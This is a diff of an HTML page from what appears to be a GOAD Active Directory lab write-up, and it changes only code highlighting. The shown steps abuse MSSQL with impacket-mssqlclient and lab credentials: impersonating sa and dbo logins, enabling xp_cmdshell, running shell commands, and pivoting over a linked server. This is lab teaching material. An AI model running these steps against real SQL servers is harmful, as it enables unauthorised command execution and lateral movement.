@@ -892,55 +892,55 @@ impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span c
 <div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local<span class="w"> </span>-windows-auth
 </code></pre></div>
 <p>Check current user privileges:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>enum_logins
+<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_logins</span>
 </code></pre></div>
 <p><img alt="north_mssql_enum_logins_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_logins_samwell.tarly.png"/></p>
 <p><code>samwel.tarly</code> <strong>cannot enable command execution</strong> with <code>xp_cmdshell</code> since it has not enough privileges:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>enable_xp_cmdshell
+<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
 </code></pre></div>
 <p><img alt="north_mssql_enable_xp_cmdshell_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enable_xp_cmdshell_samwell.tarly.png"/></p>
 <h3 id="abuse-impersonate-privileges-as-login">Abuse impersonate privileges: as Login</h3>
 <p>Check current user impersonate privileges:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>enum_impersonate
+<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_impersonate</span>
 </code></pre></div>
 <p><img alt="north_mssql_enum_impersonate_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_impersonate_samwell.tarly.png"/></p>
 <p><code>samwell.tarly</code> can impersonate as login the system administrator user <code>sa</code>;  impersonate <code>sa</code> login and enable <code>xp_cmdshell</code>:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>exec_as_login<span class="w"> </span>sa
-&gt;<span class="w"> </span>enable_xp_cmdshell
+<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">exec_as_login sa</span>
+<span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
 </code></pre></div>
 <p><img alt="north_mssql_exec_as_login_sa_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_exec_as_login_sa_samwell.tarly.png"/></p>
 <p>Execute commands on <code>CASTELBLACK.NORTH.SEVENKINGDOMS.LOCAL</code>:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span><span class="s2">"whoami &amp;&amp; hostname"</span>
+<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">xp_cmdshell "whoami &amp;&amp; hostname"</span>
 </code></pre></div>
 <p><img alt="north_mssql_command_execution_as_sa_samwell.tarly.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_command_execution_as_sa_samwell.tarly.png"/></p>
 <h3 id="abuse-impersonate-privileges-as-user">Abuse impersonate privileges: as user</h3>
 <p>With previous <code>sa</code> impersonation (or try all available user and perform enumeration with each one), enumerate again impersonate privileges:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>enum_impersonate
+<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_impersonate</span>
 </code></pre></div>
 <p><img alt="north_mssql_enum_impersonate_sa.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_impersonate_sa.png"/></p>
 <p>User <code>NORTH\arya.stark</code> has impersonate privileges as <code>dbo</code> user on <code>master</code> and <code>msdb</code>. <code>dbo</code> should have <code>xp_cmdshell</code> privileges. </p>
 <p>Login with <code>arya.stark</code> credentials and enumerate databases where current user is trusted:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>enum_db
+<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_db</span>
 </code></pre></div>
 <p><img alt="north_mssql_enum_db_arya.stark.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_db_arya.stark.png"/></p>
 <p>Use <code>msdb</code>:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>use<span class="w"> </span>msdb
+<div class="highlight"><pre><span></span><code>&gt; use msdb
 </code></pre></div>
 <p>Impersonate as user <code>dbo</code>, enable <code>xp_cmdshell</code> and run shell command</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>exec_as_user<span class="w"> </span>dbo
-&gt;<span class="w"> </span>enable_xp_cmdshell
-&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span><span class="s2">"whoami &amp;&amp; hostname"</span><span class="w"> </span>
+<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">exec_as_user dbo</span>
+<span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
+<span class="k">&gt; </span><span class="ge">xp_cmdshell "whoami &amp;&amp; hostname" </span>
 </code></pre></div>
 <p><img alt="north_mssql_exec_as_user_dbo_arya.stark.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_exec_as_user_dbo_arya.stark.png"/></p>
 <h3 id="abuse-links-trusts">Abuse links trusts</h3>
 <p>Enumerate links:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>enum_links
+<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="n">enum_links</span>
 </code></pre></div>
 <p><img alt="north_mssql_enum_links_as_sa_dbo_arya.stark.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_enum_links_as_sa_dbo_arya.stark.png"/></p>
 <p>A link exists with <code>BRAVOOS</code> and the login <code>NORTH\jon.snow</code> can log as <code>sa</code> to the remote server; login as <code>jon.snow</code> (or impersonate as login) and use the link to connect to the remote database. Being logged as <code>sa</code> to the remote SQL server, it would be possible to execute shell commands:</p>
-<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>use_link<span class="w"> </span>BRAAVOS
-&gt;<span class="w"> </span>enable_xp_cmdshell
-&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span><span class="s2">"whoami &amp;&amp; hostname"</span><span class="w"> </span>
+<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">use_link BRAAVOS</span>
+<span class="k">&gt; </span><span class="ge">enable_xp_cmdshell</span>
+<span class="k">&gt; </span><span class="ge">xp_cmdshell "whoami &amp;&amp; hostname" </span>
 </code></pre></div>
 <p><img alt="north_mssql_use_link_BRAAVOS_jon.snow.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north_mssql_use_link_BRAAVOS_jon.snow.png"/></p>
 <h3 id="mssql-relay">MSSQL Relay</h3>
